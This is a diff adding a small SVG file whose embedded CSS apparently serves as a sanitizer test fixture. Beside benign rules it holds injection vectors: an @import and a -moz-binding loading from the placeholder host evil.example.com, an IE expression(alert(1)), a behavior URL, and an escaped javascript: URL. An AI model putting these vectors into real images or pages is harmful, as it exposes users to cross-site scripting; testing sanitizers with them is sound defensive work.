@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="64" height="64">
+  <style>
+    .bg { fill: red; background: url('https://cdn.example.com/pattern.png'); }
+    @import url('https://evil.example.com/x.css');
+    .evil { fill: expression(alert(1)); }
+    .binding { -moz-binding: url('https://evil.example.com/x.xml#x'); behavior: url(#default#time2); }
+    .escaped { background: url('java\73 cript:alert(1)'); }
+    .plain { fill: #4a90d9; stroke-width: 2; }
+  </style>
+  <rect class="bg" x="0" y="0" width="32" height="32"/>
+  <rect class="escaped" x="32" y="0" width="32" height="32"/>
+</svg>
